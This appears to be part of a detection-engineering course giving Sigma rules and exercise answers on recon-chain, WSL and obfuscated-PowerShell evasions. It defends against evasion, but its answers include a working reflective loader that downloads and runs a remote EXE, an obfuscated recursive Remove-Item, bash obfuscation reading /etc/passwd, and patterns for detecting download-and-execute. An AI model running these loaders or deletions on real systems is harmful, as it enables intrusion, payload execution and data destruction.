Stop trying to detect command **chains** via command-line strings. The signal is **two or more recon binaries spawning under the same parent in a short window** — a behavioral correlation, not a substring match. In Sigma that is two documents: a single-event detection rule with a top-level `name:`, and a separate `event_count` correlation document (after the `---`) that references it by that name. The correlation must be its own document — an embedded `correlation:` block alongside `detection:` is not valid Sigma, and `rules:` references a rule **name/id**, never a detection selection:

```yaml
title: Recon Binary Chain (Hardened, Behavioral)
id: 66666666-6666-6666-6666-000000000003
status: stable
description: |
  Fires when three or more recon-family binaries spawn under a single parent process
  within 60 seconds — regardless of how they were sequenced.
correlation:
  type: event_count
  rules:
    - recon_binary_execution
  group-by:
    - ParentProcessGuid
  timespan: 60s
  condition:
    gte: 3
falsepositives:
  - Inventory and helpdesk scripts that enumerate the host in one pass
level: high
---
title: Recon Binary Execution
id: 66666666-6666-6666-6666-000000000002
name: recon_binary_execution
status: stable
description: |
  Single-event building block: one recon-family binary executing. On its own this is
  noisy and benign, so it is emitted as level:low and only becomes an alert through the
  correlation above.
logsource:
  product: windows
  category: process_creation
detection:
  selection_recon_image:
    Image|endswith:
      - '\whoami.exe'
      - '\hostname.exe'
      - '\nltest.exe'
      - '\net.exe'
      - '\net1.exe'
      - '\ipconfig.exe'
      - '\systeminfo.exe'
      - '\tasklist.exe'
      - '\quser.exe'
      - '\query.exe'
  selection_recon_ofn:
    OriginalFileName:
      - 'whoami.exe'
      - 'hostname.exe'
      - 'nltestrk.exe'
      - 'net.exe'
      - 'net1.exe'
      - 'ipconfig.exe'
      - 'sysinfo.exe'
      - 'tasklist.exe'
      - 'quser.exe'
      - 'query.exe'
  condition: selection_recon_image or selection_recon_ofn
level: low
```

The correlation logic — *3 or more recon-family binaries from the same parent in 60 seconds* — fires regardless of which delimiter the attacker used, and it catches a chain run from one shell or one script (`cmd /c script.bat`), because those recon binaries all share a parent. It does **not** catch every mechanism: recon spread across *different* parents (a separate `cmd /c` per binary) or paced beyond the 60-second window slips the same-parent / short-window bucket — Exercise 2 works through both bypasses. Broader coverage needs host / user / session aggregation over a longer window, at a higher false-positive cost.

The unit of analysis moved from "the command-line string" to "the behavioral cluster around a parent process." That move retires the entire delimiter-bypass family.

<details>
<summary><b>1.</b></summary>

A defensible argument for either:
- **ADE1 (reformatting):** the *separator character* is being substituted (`;` → `&`); the rest of the command structure is unchanged.
- **ADE2 (omit alternatives):** the rule omitted alternative valid separators the parser accepts.

Better answer: **ADE1**, because the bypass is at the *character* level (one delimiter swapped for another). ADE2 typically refers to entirely different *constructs* (e.g., `ftp.exe` and `bitsadmin.exe` as alternative download mechanisms — different tools, not different characters in the same construct).
</details>

<details>
<summary><b>2.</b></summary>

Two strategies:
1. **Spread the recon over more than 60 seconds.** Sleep between binaries: `whoami; Start-Sleep -Seconds 90; hostname; Start-Sleep -Seconds 90; nltest /domain_trusts`. The 60s window never sees more than 1.
2. **Use a different parent for each.** Spawn each recon binary under its own parent - e.g. a separate `cmd.exe /c` per binary - so each carries a distinct ParentProcessGuid and the "3+ from one parent" bucket never fills. (Scheduled tasks are murkier: tasks launched by the Task Scheduler service often share its `svchost` parent, so they may *not* split the way a naive attacker expects - test before relying on either behaviour.)

The lesson: window-based correlation is fragile. Time-based and parent-based aggregation are both bypassable. Behavioral surface (recon *family* activity from *any* sequence) needs to be modeled differently — typically via session aggregation across longer windows.
</details>

<details>
<summary><b>3.</b></summary>

```cmd
:: write a recon script
echo whoami     > %TEMP%\r.txt
echo hostname   >> %TEMP%\r.txt
echo nltest /domain_trusts >> %TEMP%\r.txt

:: run it
cmd.exe /c %TEMP%\r.txt
```

The hardened correlation rule **does** still fire because each `whoami.exe`, `hostname.exe`, `nltest.exe` is its own process-creation event under the same `cmd.exe` parent. The script-file mechanism doesn't change the fact that each recon binary spawns as a separate process. So the correlation logic catches it. The fragmentation bypass from Demo 02 fails to defeat *this* rule because the rule's unit of analysis already moved up to the parent-process level.
</details>

<details>
<summary><b>4.</b></summary>

| Family | Signal | Binaries |
|--------|--------|----------|
| **Credential dump prep** | Memory access to LSASS or SAM | rundll32 (comsvcs MiniDump), procdump, dbghelp loaders |
| **Persistence install** | Multiple autostart writes from same parent | schtasks, sc.exe, reg add (Run keys), wmic (eventfilter+consumer) |
| **Lateral discovery** | Network share enumeration | net view, net use, nltest /dclist, dsquery, adfind |

For each, the parent-aggregation pattern (3+ family members from one parent in N seconds) is high-signal because legitimate workflows rarely chain across the family.
</details>

---

## Demo 07 — WSL for PowerShell

### Hardened Detection Strategy (Maintainer's Take)

The fix is **not a single rule**. WSL bypasses require defense in depth across two axes:

1. **Detect WSL invocation itself** — `wsl.exe` is a Win32 process and *does* generate Windows telemetry. Treat any `wsl.exe` invocation as suspicious unless the parent is a known-legitimate developer tool.
2. **Detect the *artifacts* WSL leaves on the Windows side** — files appearing in `/mnt/c/` paths from the WSL VM are observable as file-creation events on the Windows host, even though no Windows process owns them.

```yaml
# Two base rules plus a temporal correlation. STATUS experimental on purpose: the join is
# deliberately loose (host + time proximity within 5 min) and its false-positive rate is
# unmeasured and environment-specific, so it ships experimental/medium until baselined, not
# stable/high. The file-create event's owner is the WSL VM / DllHost.exe, not wsl.exe, so
# there is no shared process lineage to key on. Tighten where telemetry allows: add User to
# group-by if the WSL writer runs in the invoking user's context on your build; scope
# user_writable_file_drop to the observed writer Image; or fold in WSL-side telemetry (the
# MDE plug-in / SysmonForLinux). Alert on each base rule independently if this is too noisy.
title: WSL Invocation Correlated With a User-Writable File Drop (Hardened, Temporal)
id: 77777777-7777-7777-7777-000000000002
status: experimental
correlation:
  type: temporal
  rules:
    - wsl_invocation
    - user_writable_file_drop
  group-by:
    - Computer
  timespan: 5m
level: medium
---
title: WSL Invocation
id: 77777777-7777-7777-7777-000000000004
name: wsl_invocation
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection_wsl_image:
    Image|endswith: '\wsl.exe'
  selection_wsl_ofn:
    OriginalFileName: 'wsl.exe'
  # Developer tools (Code.exe, WindowsTerminal.exe, devenv.exe) are the common benign parents
  # of wsl.exe - but do NOT hard-exclude them: an integrated terminal can launch malicious WSL
  # just as easily, so an absolute filter here becomes a bypass. Score those parents down
  # downstream (risk / context) instead of suppressing them outright.
  condition: selection_wsl_image or selection_wsl_ofn
level: medium
---
title: User-Writable Executable File Drop
id: 77777777-7777-7777-7777-000000000005
name: user_writable_file_drop
status: experimental
logsource:
  product: windows
  category: file_event
detection:
  selection_file_drop:
    TargetFilename|re|i: 'C:\\Users\\Public\\.+\.(exe|dll|ps1|js|vbs|hta|bat)$'
  condition: selection_file_drop
level: low
```

**Better long-term fix:** ingest **WSL telemetry** itself. Plain Windows-side Sysmon cannot see into WSL2 — it runs a real Linux kernel in a lightweight utility VM, so processes, file reads and network calls inside the distro never reach host process telemetry. Three ways to close that, in rough order of coverage: (1) the **Microsoft Defender for Endpoint plug-in for WSL** — a host-side MSI that auto-onboards *every* running WSL2 distro and reports process / file / network events from inside them to the host MDE service, with no per-distro install; (2) an in-distro agent — Microsoft's open-source SysmonForLinux (eBPF) or an EDR with native Linux support, one per distro; (3) `auditd` inside the distro. WSL2 is a blind spot only *until one of these is deployed* — it is not an unfixable one. Whatever you choose, the WSL logs still need their own ingestion pipeline into the SIEM.

The boundary: rules can catch `wsl.exe` invocations and downstream Windows-side artifacts (file creation via `DllHost.exe`). Rules on Windows-side telemetry alone **cannot** catch what runs inside WSL — that requires WSL telemetry ingestion (the MDE WSL plug-in or an in-distro sensor). Note that Linux-native `pwsh` runs in a Linux process context: `whoami` returns the Linux username, not the Windows identity. It has no access to LSASS, the Windows Credential Manager, or Win32 APIs. What it *can* do — invisibly — is read/write files via `/mnt/c/` (including credential files on disk), make network connections, and query network services (LDAP, SMB, WinRM) if the attacker has credentials. For actual Windows command execution, WSL interop (calling `.exe` binaries) is required, and interop calls *are* visible to Sysmon with `wsl.exe` as the parent process. The ADE classification here is ADE2 (omit alternatives — `pwsh`-on-WSL is the omitted variant). The deeper failure mode is *telemetry availability*, which the ADE Framework doesn't formalize because it's a precondition problem rather than a detection logic bug.

<details>
<summary><b>1.</b></summary>

The ADE Framework classifies this as **ADE2 (Omit Alternatives)** — the rule covers `powershell.exe` and `pwsh.exe` on Windows but omits the alternative `pwsh` running inside WSL. But the *primary* failure mode isn't really ADE2 at all — it's **telemetry availability**, which the framework intentionally doesn't formalize. ADE deals with detection logic bugs (the rule's own structure or matching). A telemetry gap means there are no events for the rule to evaluate at all — the rule could be flawless and still produce zero hits. The framework excludes this category because no amount of better rule-writing fixes it; you need ingestion changes (WSL audit log integration) instead. So the textbook ADE answer is "ADE2," but the operationally honest answer is "this bypass works because we can't see WSL telemetry, full stop."
</details>

<details>
<summary><b>2.</b></summary>

- **Containers (Docker Desktop, Kubernetes pods):** processes inside containers are visible to the container runtime but often invisible to host EDR.
- **Browser-internal execution (V8 sandboxes, Chromium content processes):** JavaScript and WASM running inside browser tabs is opaque to host telemetry; only the renderer process is visible.
- **Hyper-V / VMware / VirtualBox guest VMs:** processes inside guest VMs are invisible to the host EDR; you'd need an agent inside each VM.
- **Office macros running in protected views:** sandboxed VBA execution generates limited telemetry depending on EDR depth.
- **MSIX / packaged app runtime:** modern packaged Windows apps run with virtualized filesystem and registry; some EDRs miss the virtualization layer.
</details>

<details>
<summary><b>3.</b></summary>

The rule fires on file creation in `C:\Users\Public\` with a script/binary extension. Bypass:
- **Drop into `C:\Users\<currentuser>\AppData\Local\Temp\`** instead — a path the rule doesn't watch but most LOLBins can read from.
- **Drop with an innocuous extension** (`.dat`, `.tmp`, `.log`) and rename via legitimate Windows-side script later.
- **Drop into an existing folder** the user already owns — bypassing the path-prefix filter entirely.

The rule's path-prefix list is, fundamentally, an ADE2 problem: enumerated alternatives. Any path not enumerated is a free pass.
</details>

<details>
<summary><b>4.</b></summary>

```
T=0:    WSL pwsh writes a payload to /mnt/c/Users/Public/Documents/legit-looking.ps1
T=0+1s: WSL pwsh drops the payload to a user-writable path the victim will open later
        (e.g., /mnt/c/Users/Public/Documents/, a shared drive, a startup folder)
T=hours later: User double-click, autostart pickup, or attacker-scheduled schtasks
                executes the payload from that path
```

The temporal separation defeats the `wsl_invocation` + `user_writable_file_drop` temporal correlation, which only fires if both land within its window (minutes). The detection that survives: **file-content scanning at write-time** (YARA on every file written to user-writable paths), and **execution-time behavioral chaining** (the file that was eventually executed had no Windows-side process owner at write-time — that's a flag in itself).
</details>

<details>
<summary><b>5.</b></summary>

Required telemetry:
- **File reads:** WSL audit logs (`auditd` inside the WSL distro) or SysmonForLinux — these are the *only* source for file-read events on `/mnt/c/` paths. Windows-side Sysmon does NOT see file reads originating from inside WSL2.
- **Network connections:** *under the default NAT networking mode*, WSL2 runs its own network stack on a separate virtual subnet (e.g., `172.x`). Outbound connections are then **invisible to Windows `netstat` and Windows EDR** — they don't appear under `vmcompute.exe` or any other Windows process, and the only way to observe them is from inside WSL (`auditd` network syscall logging, SysmonForLinux, or an EDR agent in the distro). Two Windows 11 22H2+ features change this and are worth checking before assuming a blind spot: **Hyper-V Firewall** (WSL 2.0.9+, enabled with `firewall=true` in `.wslconfig`) can filter WSL inbound/outbound traffic host-side — and traffic a host firewall can filter is traffic a host sensor can see; and **mirrored networking mode** (`networkingMode=mirrored`) drops the separate subnet entirely, giving the WSL2 instance the host's interfaces and LAN address. Scope the "invisible" claim to NAT mode.

Rule (requires WSL-side telemetry ingestion):
```
within 5 minutes (correlated inside WSL telemetry):
  - count(distinct files read from /mnt/c/Users/<u>/Documents) >= 50
  - AND outbound network connection from same WSL session
  - AND destination not in corporate allowlist
```

Cost: both signals require telemetry from *inside* the WSL distro — the MDE WSL plug-in (host-side, auto-onboards all distros), `auditd`, or SysmonForLinux — with a log pipeline into your SIEM. Without one of those, WSL exfiltration is a blind spot to *plain Windows tooling* — it sees neither the file reads nor the NAT-mode network connections. Deploy the plug-in or an in-distro sensor and both become visible.
</details>

---

## Demo 08 — Obfuscation

### Hardened Detection Strategy (Maintainer's Take)

Defense in depth across **four layers**.

**Layer 1 — Sigma rule on construction primitives.** Catches the most common obfuscation building blocks at the script-content layer:

```yaml
title: PowerShell Obfuscated Execution (Hardened, Multi-Layer)
id: 88888888-8888-8888-8888-000000000002
status: stable
description: |
  Layered detection for obfuscated PowerShell. Each rule below catches one signal.
  Together they raise the cost of obfuscation substantially.
logsource:
  product: windows
  category: ps_script
detection:
  # 1. Suspicious construction primitives in the script block
  selection_obfuscation_primitives:
    ScriptBlockText|re|i:
      - '\[char\]\s*\d+'                       # [char]NN
      - "'[^']*'\\s*\\+\\s*'[^']*'"          # 'IE'+'X'  (any-length string-literal concat)
      - '-join\s*\(\(.+\)\.Split'             # array join after split
      - '\[Convert\]::FromBase64String'          # Base64 decode
      - '\[System\.IO\.Compression\.GzipStream\]'  # gzip decompression
      - '\[scriptblock\]::Create'                # runtime scriptblock construction
      - '-bxor\s*0x'                              # XOR decoding
      - '\bset-alias\s+\S+\s+(?:IEX|Invoke-Expression|Invoke-Command|New-Object|Add-Type)'  # aliasing of sensitive cmdlets
  # 2. Network-fetched code execution patterns (regardless of how IEX is spelled)
  selection_invoke_web:
    ScriptBlockText|re|i:
      - '(IEX|Invoke-Expression|&\s*\(?\[scriptblock\])'
  selection_web_fetch:
    ScriptBlockText|re|i:
      - '(DownloadString|DownloadData|Invoke-WebRequest|Invoke-RestMethod|Net\.WebClient)'
  condition: selection_obfuscation_primitives or (selection_invoke_web and selection_web_fetch)
falsepositives:
  - Legitimate installer scripts (e.g., scoop, chocolatey) — scope by user/path
level: high
```

**Layer 2 — Script Block Logging (Event ID 4104) must be enabled.** Without it, you're working from command-line content alone and obfuscation wins. Enabling `EnableScriptBlockLogging` alone gets you the text of *dynamically generated* script blocks too — when PowerShell builds a script block at runtime (e.g. `[scriptblock]::Create($decoded)`), that new block is compiled and its **deobfuscated text is logged as its own 4104 event**. The separate `EnableScriptBlockInvocationLogging` setting is *not* required for this; it only adds 4105/4106 start/stop markers for execution-chaining, and Microsoft warns it "generates a high volume of event logs." Turn it on for execution ordering, not for payload visibility.

**Layer 3 — AMSI integration.** AMSI hands the *deobfuscated* buffer to the registered AV/EDR before execution — a second, independent look at the resolved content that catches what script-block logging misses when SBL is disabled or bypassed. Note AMSI is an integration *interface*, not a universal event log: the resolved content reaches your SIEM only where the AV/EDR forwards it (for example, Microsoft Defender surfaces AMSI-driven detections as events 1116/1117). Treat this layer as "if your AV/EDR exposes it," not guaranteed.

**Layer 4 — Behavioral chaining.** PowerShell process spawned, made an outbound HTTP request within 5s, and then either spawned a child or wrote a file. The behavior is invariant; the string isn't. This layer catches obfuscation strategies that defeat the first three layers entirely.

**Memory inspection** (EDR-dependent) is a fifth layer when available — once obfuscation is unrolled in memory, EDRs that scan PowerShell's runspace can match on the resolved string. Cost is non-trivial; reserve for high-value endpoints.

The key insight: each layer raises the attacker's cost. Layer 1 alone is bypassed in a day. All four together push obfuscation into custom-tooling territory — which is the equilibrium-shift you want.

<details>
<summary><b>1.</b></summary>

SBL captures script blocks **as they are compiled by the PowerShell engine**. So:

- **Catches:** source-level obfuscation (`'IE'+'X'`, `[char]73`, format strings, `-join`) — 4104 logs the script block's *source text*, so the construction itself is on record (the concatenation, the `[char]` run), which is exactly what the Layer 1 regexes match. 4104 records the source *as written*; it does not rewrite `'IE'+'X'` into `IEX` for you — you match the construction, not a resolved keyword.
- **Catches (with a catch):** runtime construction (`[scriptblock]::Create($decoded_string)` where `$decoded_string` was built from Base64 decoding at runtime). The *outer* script block is logged showing the construction code, and the *inner* synthesized script block is **also** logged — its deobfuscated text lands in its own 4104 event when it is compiled. Basic `EnableScriptBlockLogging` is enough for this; `EnableScriptBlockInvocationLogging` is *not* required (it only adds 4105/4106 start/stop events). The residual gap is timing: you only see the inner block once the payload actually runs, so it is a record after the fact, not a preventive control.
- **Misses:** AMSI bypasses, runspace creation in custom .NET, and inline C# / Add-Type that compiles entirely outside the PowerShell parser.
</details>

<details>
<summary><b>2.</b></summary>

Five primitives and one that resists static detection. The regexes are given in a code block, not a table: GitHub-flavoured Markdown eats the backslash in `\|` inside a table cell, and two of these patterns contain an alternation whose left side would silently become empty — turning them into always-match rules. Keep them in a fenced block so the backslashes survive.

| Primitive | Example |
|-----------|---------|
| `$IFS` substitution for spaces | `cat${IFS}/etc/passwd` |
| Brace expansion | `{cat,/etc/passwd}` |
| Base64 piping | `echo BASE64 \| base64 -d \| sh` |
| Command substitution | `$(printf 'cat\n')` |
| Variable indirection | `a=cat; $a /etc/passwd` — hard to detect statically |
| Reverse string + rev | `echo dwssap/cte/ \| rev` |

```text
$IFS substitution      \$\{?IFS\}?
brace expansion        \{[^}]*,[^}]*\}
base64 decode + pipe   base64\s+(-d|--decode)\b
command substitution   \$\([^)]+\)
reverse via rev        \|\s*rev\b
```

(Variable indirection has no reliable static pattern — `$a` could be anything — so it is left for behavioral or AMSI layers.)
</details>

<details>
<summary><b>3.</b></summary>

```powershell
Add-Type -TypeDefinition @"
using System.Net;
using System.Reflection;
public class L {
  public static void Run(string u) {
    // downloaded assembly must be an EXE (have an EntryPoint); a DLL's EntryPoint is null.
    // pass an args array so Main(string[]) binds — Invoke(null, null) throws on a parameterful Main.
    Assembly.Load(new WebClient().DownloadData(u)).EntryPoint.Invoke(null, new object[]{ new string[]{} });
  }
}
"@
[L]::Run('http://x/y.exe')
```

Triggers none of the regex primitives because: no `[char]`, no string concat, no `-join`, no Base64, no GzipStream, no `[scriptblock]::Create`, no XOR. The payload is reflectively loaded as a .NET assembly; PowerShell never sees the script block of what's running. Two implementation notes the reflective loader depends on: `Assembly.Load` on a **DLL** returns an assembly whose `EntryPoint` is `null`, so this pattern must download an **EXE** assembly; and `Invoke(null, null)` throws `TargetParameterCountException` against the usual `Main(string[])`, so pass an argument array (`new object[]{ new string[]{} }`). Defense: **AMSI** captures the `Add-Type` content; **EDR memory inspection** sees the loaded assembly. Static-rule defense is fundamentally lost here.
</details>

<details>
<summary><b>4.</b></summary>

```powershell
$ie = ('I' + 'E' + 'X')                                    # IEX built by concatenation
&$ie 'Re""move-Item C:\target -Recurse -Force:1'           # quote-spliced cmdlet name + -Force:1
```

Layers (each maps to the demo whose *technique* it borrows):
- **IEX hidden via string concatenation** — obfuscation (Demo 08). Defeats **Demo 08**'s literal `IEX` match (the naive rule at the top of this demo).
- **`-Force:1` instead of `-Force:$true`** — boolean replacement (Demo 04). Defeats **Demo 04**'s literal `:$true`.
- **`Re""move-Item` — the cmdlet name with an empty `""` spliced in** — quote manipulation (Demo 05). PowerShell strips the empty quotes and resolves the token to `Remove-Item` (verified: the call reaches `Remove-Item` on both 5.1 and 7). This defeats **Demo 04**'s literal `Remove-Item` cmdlet-name match, using the quoting trick from Demo 05.

(The cmdlet name is hidden with the *quote-manipulation* technique from Demo 05, but the literal it defeats lives in **Demo 04**'s rule — Demo 05's own rule keys on a *flag*, `/disable`, not a cmdlet name.)

What catches it:
- **Script Block Logging** — the entire source is logged including the concatenations and the `&$ie ...` invocation.
- **AMSI** — the resolved string passed to `IEX` is sent to AMSI for scanning.
- **Behavioral** — `Remove-Item` ultimately executes; the FileDelete events are observable regardless of how the call was constructed.
- **Memory inspection** — once executed, the resolved cmdlet appears in the runspace.
</details>

